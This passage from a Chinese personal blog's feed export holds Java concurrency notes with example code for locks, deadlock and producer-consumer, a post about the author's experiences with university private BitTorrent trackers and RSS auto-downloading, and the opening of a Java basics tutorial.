java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (list) &#123;</span><br><span class="line">                    list.add(Thread.currentThread().getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不安全的例子，加上同步块后就安全了。</p><h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><p><code>CopyOnWriteArrayList</code>，写数组的拷贝，支持高效率并发且是线程安全的，读操作无锁。所有可变操作都是通过对底层数组进行一次复制来实现。底层实现添加的原理是先copy出一个容器（可以简称副本），再在副本里进行修改，最后把副本的引用地址赋值给之前旧容器的地址。在修改数据期间，其他线程如果读取数据，是读取到旧容器里的数据。</p><p>参考：<a href="https://blog.csdn.net/weixin_42146366/article/details/88016527">高并发编程之CopyOnWriteArrayList介绍</a></p><p><code>CopyOnWriteArrayList</code>也是属于<code>java.util.concurrent</code>工具包的，<a href="https://blog.csdn.net/yuhaibao324/article/details/93149186">Java的concurrent用法详解</a>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJUC</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      CopyOnWriteArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; list.add((Thread.currentThread().getName()))).start();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(list.size());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p>多个线程互相抱着对方需要的资源，形成僵持。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//两个人化妆，需要镜子和口红，都是抱着对方需要的资源，形成死锁。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLock</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Makeup</span>(<span class="number">0</span>, <span class="string">&quot;Nina&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Makeup</span>(<span class="number">1</span>, <span class="string">&quot;Amelie&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Lipstick</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mirror</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Makeup</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">   <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Lipstick</span> <span class="variable">lipstick</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Lipstick</span>();</span><br><span class="line">   <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Mirror</span> <span class="variable">mirror</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mirror</span>();</span><br><span class="line">   <span class="type">int</span> choice;</span><br><span class="line">   String grilName;</span><br><span class="line"></span><br><span class="line">   Makeup(<span class="type">int</span> choice, String grilName) &#123;</span><br><span class="line">      <span class="built_in">this</span>.choice = choice;</span><br><span class="line">      <span class="built_in">this</span>.grilName = grilName;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         makeup();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">makeup</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="keyword">if</span> (choice == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="keyword">synchronized</span> (lipstick) &#123;</span><br><span class="line">            System.out.println(<span class="built_in">this</span>.grilName + <span class="string">&quot; gets lipstick&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">synchronized</span> (mirror) &#123;</span><br><span class="line">               System.out.println(<span class="built_in">this</span>.grilName + <span class="string">&quot; gets mirror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">synchronized</span> (mirror) &#123;</span><br><span class="line">            System.out.println(<span class="built_in">this</span>.grilName + <span class="string">&quot; gets mirror&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="keyword">synchronized</span> (lipstick) &#123;</span><br><span class="line">               System.out.println(<span class="built_in">this</span>.grilName + <span class="string">&quot; gets lipstick&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>产生死锁的四个必要条件：</p><ul><li><strong>互斥条件</strong>：一个资源每次只能被一个进程使用。</li><li><strong>请求与保持条件</strong>：一个进程因请求资源而阻塞时，对已获得的资源保持不放。</li><li><strong>不剥夺条件</strong>：进程已获得的资源，在未使用完之前，不能强行剥夺。</li><li><strong>循环等待条件</strong>：若干进程之间形成一种头尾相接的循环等待资源关系。</li></ul><p>想办法打破其中的一个或多个条件就可以避免。</p><h2 id="Lock-锁"><a href="#Lock-锁" class="headerlink" title="Lock(锁)"></a>Lock(锁)</h2><p>通过显式定义同步锁对象（Lock对象）来实现同步。<code>java.util.concurrent.locks.Lock</code>接口可以控制多个线程对共享资源进行访问。<code>ReentrantLock </code>是可重入锁，实现了显式加锁、释放锁。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m</span><span class="params">()</span> &#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//保证线程安全的代码</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">        <span class="comment">//如果同步代码有异常，要将unlock()写入finally块。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比：<code>Lock</code>是显式，<code>synchronized</code>是隐式。<code>Lock</code>只有代码块锁，<code>synchronized</code>有代码块锁和方法锁。使用<code>Lock</code>锁，JVM将话费较少时间调度线程，性能更好，且具有更好的扩展性。一般优先使用<strong>Lock&gt;同步代码块&gt;同步方法</strong>。</p><h1 id="线程通信"><a href="#线程通信" class="headerlink" title="线程通信"></a>线程通信</h1><p>java提供了几个方法解决线程之间的通信问题。均是Object类的方法，都只能在同步方法或者同步代码块中使用，否则会抛出异常<code>IllegalMonitorStateException</code>。</p><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>wait()</td><td>表示线程一直等待，直到其他线程通知，与sleep不同，会释放锁</td></tr><tr><td>wait(long timeout)</td><td>指定等待的毫秒数</td></tr><tr><td>notify()</td><td>唤醒一个处于等待状态的线程</td></tr><tr><td>notifyAll()</td><td>唤醒同一个对象上所有调用wait()方法的线程，优先级别高的线程优先调度</td></tr></tbody></table><p>在<a href="https://blog.csdn.net/liushall/article/details/81569609">生产者消费者</a>问题中，仅有<code>synchronized</code>是不够的，<code>synchronized</code>可阻止并发更新同一个共享资源，但不能用来实现不同线程之间的消息传递。</p><h2 id="管程法"><a href="#管程法" class="headerlink" title="管程法"></a>管程法</h2><p>生产者将生产号的数据放入缓冲区，消费者从缓冲区拿出数据。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//管程法——生产者，消费者，产品，缓冲区</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPC</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">SynContainer</span> <span class="variable">container</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SynContainer</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Producer</span>(container).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Consumer</span>(container).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">   SynContainer container;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Producer</span><span class="params">(SynContainer container)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.container = container;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">         container.push(<span class="keyword">new</span> <span class="title class_">Chicken</span>(i));</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">   SynContainer container;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Consumer</span><span class="params">(SynContainer container)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.container = container;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">         container.pop();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//产品</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Chicken</span> &#123;</span><br><span class="line">   <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Chicken</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.id = id;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//缓冲区</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SynContainer</span> &#123;</span><br><span class="line">   Chicken[] chickens = <span class="keyword">new</span> <span class="title class_">Chicken</span>[<span class="number">10</span>]; <span class="comment">//容器</span></span><br><span class="line">   <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//容器计数器</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(Chicken chicken)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == chickens.length) &#123; <span class="comment">//等待消费者消费</span></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//生产并通知消费者消费</span></span><br><span class="line">      chickens[count++] = chicken;</span><br><span class="line">      System.out.println(<span class="string">&quot;produced id = &quot;</span> + chicken.id + <span class="string">&quot;, container &quot;</span> + count);</span><br><span class="line">      <span class="built_in">this</span>.notifyAll();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>) &#123; <span class="comment">//等待生产者生产</span></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//消费并通知生产者继续生产</span></span><br><span class="line">      System.out.println(<span class="string">&quot;consumed id = &quot;</span> + chickens[--count].id + <span class="string">&quot;, container &quot;</span> + count);</span><br><span class="line">      <span class="built_in">this</span>.notifyAll();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/TestPc.JPG"></p><h2 id="信号灯法"><a href="#信号灯法" class="headerlink" title="信号灯法"></a>信号灯法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//信号灯法，标志位解决</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPc2</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">TV</span> <span class="variable">tv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TV</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Actor</span>(tv).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Watcher</span>(tv).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Actor</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">   TV tv;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Actor</span><span class="params">(TV tv)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.tv = tv;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.tv.act(<span class="string">&quot;dance&quot;</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.tv.act(<span class="string">&quot;sing&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Watcher</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">   TV tv;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Watcher</span><span class="params">(TV tv)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.tv = tv;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">         <span class="built_in">this</span>.tv.watch();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//产品</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TV</span> &#123;</span><br><span class="line">   String show;</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;<span class="comment">//演员表演 T; 观众观看 F</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">act</span><span class="params">(String show)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!flag) &#123; <span class="comment">//等观众看完</span></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;Act &quot;</span> + show);</span><br><span class="line">      <span class="built_in">this</span>.notifyAll();</span><br><span class="line">      <span class="built_in">this</span>.show = show; <span class="comment">//新节目</span></span><br><span class="line">      <span class="built_in">this</span>.flag = !<span class="built_in">this</span>.flag; <span class="comment">//修改标志位</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">watch</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;Watch &quot;</span> + show);</span><br><span class="line">      <span class="built_in">this</span>.notifyAll();</span><br><span class="line">      <span class="built_in">this</span>.flag = !<span class="built_in">this</span>.flag;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/TestPc2.JPG"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>接触PT的一些经历</title>
      <link href="/2021/06/17/PT/"/>
      <url>/2021/06/17/PT/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是PT"><a href="#什么是PT" class="headerlink" title="什么是PT"></a>什么是PT</h2><p>Private Tracker。</p><blockquote><ol><li>PT 本质上还是<strong>基于 BitTorrent 协议的一种 P2P 下载</strong>，这点跟 BT 是一样</li><li>PT 是通过一个私有的Tracker服务器认证，在小范围内进行通信以及下载</li><li>在 Private Tracker 服务器上对用户的下载量、上传量以及下载上传时间进行<strong>数据统计</strong></li></ol></blockquote><p>更多关于PT的详细介绍，可以阅读<a href="https://www.jianshu.com/p/3daf90e9d241">Private Tracker（PT）新手使用小记</a>和<a href="https://post.smzdm.com/p/a3gvvddr/">PT基本概念+生存指南</a>。</p><h2 id="蝴蝶时期：0下载"><a href="#蝴蝶时期：0下载" class="headerlink" title="蝴蝶时期：0下载"></a>蝴蝶时期：0下载</h2><img src="https://img.lfalive.top/PT/HUDPT.jpg" style="zoom:67%;" /><p>PT的关键词就是Private，所以我进了蝴蝶，毕竟高校PT站至少应该都是对自己本校学生开放的吧……</p><p>用户太少，资源太少，导致很快我就对蝴蝶失去了兴趣。</p><h2 id="百川时期：不会做种"><a href="#百川时期：不会做种" class="headerlink" title="百川时期：不会做种"></a>百川时期：不会做种</h2><p>疫情期间，在家的时候需要下载一些学习资料，几经周折又摸到了PT。但是大部分高校PT都是教育网IPV6独享，在家无法访问。最后找到了哈工大的百川，可以非教育网访问。</p><p>这个阶段，我对PT还没有概念，将PT当作传统的资源站，只管下载。尽管发现我的上传量偶尔会增加，但是也不明白其中的用户规则。至今我的百川分享率还小于1。</p><p><img src="https://img.lfalive.top/PT/hitpt.JPG"></p><h2 id="北邮人时期：学会做种"><a href="#北邮人时期：学会做种" class="headerlink" title="北邮人时期：学会做种"></a>北邮人时期：学会做种</h2><p>时隔八个月回到学校后，就可以访问教育网only的PT站了。这个阶段我上了北邮人，还是使用μtorrent客户端。你可以<strong>点击下图</strong>进入北邮人，加载下图需要IPV6，站点也需要，随缘吧。</p><center><a href="https://byr.pt/promotionlink.php?key=565afa64ae1e5bcaae260a1fc388aaac"><img src="https://byr.pt/mybar.php?userid=344334.png" style="zoom:150%;" alt="北邮人" title="北邮人"></a></center><p>接触到种子促销、做种等概念后，我有事无事就会挂着客户端，也会去蹲一些热门的种子，尽早下载并开始做种。</p><h2 id="北洋园时期：进阶技巧"><a href="#北洋园时期：进阶技巧" class="headerlink" title="北洋园时期：进阶技巧"></a>北洋园时期：进阶技巧</h2><p>临近毕业，我开始意识到，失去校园网，就失去了北邮人的访问权限，于是开始寻找非教育网可以访问的PT站点，这才注册了北洋园。</p><p>和北邮人相比，北洋园有官方组，更新的剧集资源更多，并且分天大校外IPv4&#x2F;IPv6&#x2F;天大校内IPv4不同通道。另一方面，北洋园正在推行H&amp;R规则，为了之后站点从分享率（Ratio）考核模式转变为无视分享率（RatioLess）模式。总而言之，两个站点有很多不同之处。</p><p>这个时候，我常常下载两个站点共有的一些资源，同时在两个站点做种。你可以<strong>点击下图</strong>进入北洋园。</p><center><a href="https://www.tjupt.org/promotionlink.php?key=287fa0ea36bd65ca9c50d5b1599d2268"><img src="https://tjupt.org/mybar.php?userid=115139.png" alt="北洋园PT" title="北洋园PT"></a></center><h3 id="双栈做种"><a href="#双栈做种" class="headerlink" title="双栈做种"></a>双栈做种</h3><p>默认打开客户端，只会上报IPV6地址，仅能和IPV6用户交流。实现双栈做种后，即可和校外IPV4用户交流。设置双栈做种时，先在本机网络适配器中关闭IPV6协议，然后ping一下tracker服务器，得到一个IPV4地址，将这个IPV4地址和tracker服务器域名写进系统的hosts文件，再开启IPV6协议即可。</p><img src="https://img.lfalive.top/PT/double.JPG" style="zoom:80%;" /><h3 id="RSS订阅"><a href="#RSS订阅" class="headerlink" title="RSS订阅"></a>RSS订阅</h3><p>刚使用TJUPT的时候，总是抢不到热门免费资源，做种机会不多。这时我了解到RSS技术，提供一种实时、高效、安全、低成本的信息发布渠道。可以参考<a href="http://www.ptyqm.com/1235.html">从此“不再”登陆PT站！RSS订阅+qbittorrent自动下载使用教程</a>。</p><p>目前我接触的PT站点都是支持RSS订阅的，在网站中可以很方便地按照特定规则筛选得到RSS链接。</p><img src="https://img.lfalive.top/PT/RSS_get.JPG" style="zoom:67%;" /><p>同时我将客户端换为qbittorrent 4.3.5，更好看，功能更丰富。当然，μtorrent也是支持RSS订阅的。开启自动更新和自动下载，就差不多大功告成。</p><img src="https://img.lfalive.top/PT/RSS_Setting.JPG" style="zoom:80%;" /><p>最后配置一下下载目录等规则，即可自动化下载储存连载剧集，十分方便。</p><img src="https://img.lfalive.top/PT/RSS.JPG" style="zoom:67%;" /><h2 id="下一个阶段？"><a href="#下一个阶段？" class="headerlink" title="下一个阶段？"></a>下一个阶段？</h2><p>我试图继续探索更多的高效PT，例如南洋、葡萄、蒲公英，无奈处处碰壁。</p><img src="https://img.lfalive.top/PT/nanyang.JPG" style="zoom:80%;" /><img src="https://img.lfalive.top/PT/putao.JPG" style="zoom:80%;" /><p><img src="https://img.lfalive.top/PT/%E8%92%B2%E5%85%AC%E8%8B%B1.JPG"></p><p>如果还有下一个阶段，应该是要跳出高校PT，进入其他PT站，并且拥有更高的网络带宽和更大的硬盘容量吧。</p><h2 id="Ourbits"><a href="#Ourbits" class="headerlink" title="Ourbits"></a>Ourbits</h2><p>OurBits（<a href="https://ourbits.club/promotionlink.php?key=0a9fd57fb41cf6f4e6e9f7484e804694">https://ourbits.club</a>）是一个综合性资源分享网站，成立于2016年11月，现有官方压制PbK小组、iLoveHD小组、DIY小组、Remux小组、OurTV小组、FLTTH小组、Ao小组、录制iLoveTV小组、音乐HosT小组等，资源主要涵盖影视、动漫、纪录片、综艺及无损音乐等资源，旨在打造一流高清影视分享、交流平台，本站支持IPV4与ipv6地址互联，教育网用户与公网用户皆有可观的速度，欢迎所有热爱高清影视的朋友前来分享与交流！</p><p>通过北邮人论坛的邀请渠道进的，可能是等级过低，加载不出流量条。<a href="https://ourbits.club/mybar.php?userid=50208.png">https://ourbits.club/mybar.php?userid=50208.png</a></p><h2 id="PuTao"><a href="#PuTao" class="headerlink" title="PuTao"></a>PuTao</h2><p>上海交大的葡萄应该是最难进的高校PT了，也支持V4+V6访问，毕业后还能用。交大hxd用30w魔力换邀请我，属实感动。</p><p><img src="https://pt.sjtu.edu.cn/mybar.php?userid=175098.png"></p><h2 id="PT-Plugin-Plus"><a href="#PT-Plugin-Plus" class="headerlink" title="PT Plugin Plus"></a>PT Plugin Plus</h2><p>一款很好用的浏览器插件。项目地址为<a href="https://github.com/ronggang/PT-Plugin-Plus%E3%80%82">https://github.com/ronggang/PT-Plugin-Plus。</a></p><p>方便管理各站数据。有些数据无法获取，待修复。</p><img src="https://img.lfalive.top/PT/PT-Plugin-Plus-UserData.png" style="zoom:80%;" />]]></content>
      
      
      <categories>
          
          <category> PT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习笔记(1)——基础</title>
      <link href="/2021/03/30/Learn-java-base/"/>
      <url>/2021/03/30/Learn-java-base/</url>
      
        <content type="html"><![CDATA[<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p><a href="https://www.kuangstudy.com/">狂神说java官网</a></p><p><a href="https://www.bilibili.com/video/BV12J41137hu">B站视频链接</a></p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"><span class="doctag">@Description</span> 文档注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="标识符和关键字"><a href="#标识符和关键字" class="headerlink" title="标识符和关键字"></a>标识符和关键字</h2><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><img src="https://img.lfalive.top/Learn-java-base/keyword.JPG" style="zoom:60%;" /><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>以字母、美元符、下划线开头。大小写敏感。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><table><thead><tr><th align="center">类型</th><th align="center">大小</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">byte</td><td align="center">1字节</td><td 